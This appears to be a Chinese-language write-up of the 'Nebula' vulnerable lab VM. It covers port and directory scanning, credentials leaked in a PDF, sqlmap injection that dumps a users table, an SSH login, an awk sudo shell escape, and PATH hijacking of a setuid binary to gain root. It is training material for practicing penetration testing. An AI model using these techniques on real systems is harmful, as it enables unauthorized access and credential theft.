# Nebula

:::note

[Linux VM] [Tested on VirtualBox and VMWare.] created by || Kretinga

⏲️ Release Date // 2024-01-02

✔️ MD5 // e776777fb487bea62da80840b03c8fe6

☠ Root // 70

💀 User // 68

📝Notes //
Enjoy.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.108
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.108
Host is up (0.00049s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Nebula Lexus Labs
```

## web 服务

尝试进行目录爆破

```shell
┌─[✗]─[randark@parrot]─[~]
└──╼ $feroxbuster -u http://192.168.56.108 -w /usr/share/wordlists/seclists//Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.108
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists//Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      314c http://192.168.56.108/img => http://192.168.56.108/img/
301      GET        9l       28w      316c http://192.168.56.108/login => http://192.168.56.108/login/
200      GET      117l      627w    49089c http://192.168.56.108/img/image1
200      GET     1121l     5980w   469563c http://192.168.56.108/img/image2
200      GET       76l      291w     3479c http://192.168.56.108/
301      GET        9l       28w      317c http://192.168.56.108/joinus => http://192.168.56.108/joinus/
```

对 `http://192.168.56.108/joinus/` 这个路径进行探测，发现以下信息

```plaintext title="http://192.168.56.108/joinus/application_form.pdf"
https://nebulalabs.org/meetings?user=admin&password=d46df8e6a5627debf930f7b5c8f3b083
```

得到以下凭据

```plaintext
admin:d46df8e6a5627debf930f7b5c8f3b083
```

成功登陆后台

### 搜索功能存在 sql 注入

对浏览器的访问请求进行抓包

```plaintext
GET /login/search_central.php?id=1 HTTP/1.1
Host: 192.168.56.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Referer: http://192.168.56.108/login/search_central.php?id=1
Cookie: PHPSESSID=p8mg4vbtsjc4iahtr48g4koi76
Upgrade-Insecure-Requests: 1
```

将原始请求的数据保存为 `sqlmap.txt` 文件，进行自动化攻击

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $sqlmap -r sqlmap.txt --dbs
......
[*] information_schema
[*] nebuladb
┌─[randark@parrot]─[~/tmp]
└──╼ $sqlmap -r sqlmap.txt -D nebuladb --tables
......
+----------+
| central  |
| centrals |
| users    |
+----------+
```

将数据库的数据 dump 下来

```plaintext
Database: nebuladb
Table: users
[7 entries]
+----+----------+----------------------------------------------+-------------+
| id | is_admin | password                                     | username    |
+----+----------+----------------------------------------------+-------------+
| 1  | 1        | d46df8e6a5627debf930f7b5c8f3b083             | admin       |
| 2  | 0        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
| 3  | 0        | 5f823f1ac7c9767c8d1efbf44158e0ea             | Frederick   |
| 3  | 0        | 4c6dda8a9d149332541e577b53e2a3ea             | Samuel      |
| 5  | 0        | 41ae0e6fbe90c08a63217fc964b12903             | Mary        |
| 6  | 0        | 5d8cdc88039d5fc021880f9af4f7c5c3             | hecolivares |
| 7  | 1        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
+----+----------+----------------------------------------------+-------------+
```

得到一组凭据

```plaintext
pmccentral:999999999
```

## User - pmccentral

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs pmccentral@192.168.56.108
[19:46:46] Welcome to pwncat 🐈!
Password: *********
[19:46:50] 192.168.56.108:22: registered new host w/ db
(local) pwncat$ back
(remote) pmccentral@laboratoryuser:/home/pmccentral$ whoami
pmccentral
```

### 读取命令行历史

```shell title="/home/pmccentral/.bash_history"
ls
cd laboratoryuser/
sudo su
cd pmccentral/
ls
nano
ls
mkdir desktop downloads documents
ls
ll
exit
ls
tree
ls
ls desktop/k
ls desktop/
ls documents/
ls
ls downloads/
cd documents/
ls
cat employees.txt
cd ..
ls
cd laboratoryadmin/
ls
cd autoScripts/
ls
whoami
ll
ls
cd ..
ls
exit
ls
cd documents/
exit
```

### 尝试提权

```shell title="sudo -l"
(remote) pmccentral@laboratoryuser:/home/pmccentral$ sudo -l
[sudo] password for pmccentral:
Matching Defaults entries for pmccentral on laboratoryuser:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
```

尝试利用 awk 实现提权

```shell
sudo -u laboratoryadmin /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

## User - laboratoryadmin

```shell
laboratoryadmin@laboratoryuser:/home/pmccentral$ whoami
laboratoryadmin
```

### flag - user

```shell
laboratoryadmin@laboratoryuser:~$ cat user.txt
flag{$udOeR$_Pr!V11E9E_I5_7En53}
```

### 尝试提权

对用户目录进行探测

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ pwd;ls -lah
/home/laboratoryadmin/autoScripts
total 32K
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4.0K Dec 18 20:16 .
drwx------ 8 laboratoryadmin laboratoryadmin 4.0K Dec 18 16:15 ..
-rwxrwxr-x 1 laboratoryadmin laboratoryadmin    8 Dec 18 20:16 head
-rwsr-xr-x 1 root            root             17K Dec 17 15:40 PMCEmployees
```

将两个程序都下载到本地进行分析

## 程序逆向分析

### PMCEmployees

对程序进行反编译

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  printf("Showing top 10 best employees of PMC company");
  return system("head /home/pmccentral/documents/employees.txt");
}
```

并且可以注意到 `/home/laboratoryadmin/autoScripts/head` 这个文件是可控的，那么就可以直接接管权限了

### head 文件分析

```plaintext title="/home/laboratoryadmin/autoScripts/head"
bash -p
```

:::note

好奇怪，这个靶机的作者这是直接把提权方案直接往嘴巴里面喂？

:::

## User - root

:::note

下面的方案暴力修改了 PATH 环境变量，不建议使用此方案

:::

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ echo '/usr/bin/bash -p' > head
laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
root@laboratoryuser:~/autoScripts# /usr/bin/whoami
root
```

:::note

建议使用此方案

:::

```shell
(remote) laboratoryadmin@laboratoryuser:/home/laboratoryadmin/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts:$PATH
(remote) laboratoryadmin@laboratoryuser:/home/laboratoryadmin/autoScripts$ ./PMCEmployees
root@laboratoryuser:~/autoScripts# whoami
root
```

### flag - root

```shell
root@laboratoryuser:/root# cat root.txt
flag{r00t_t3ns0}
```
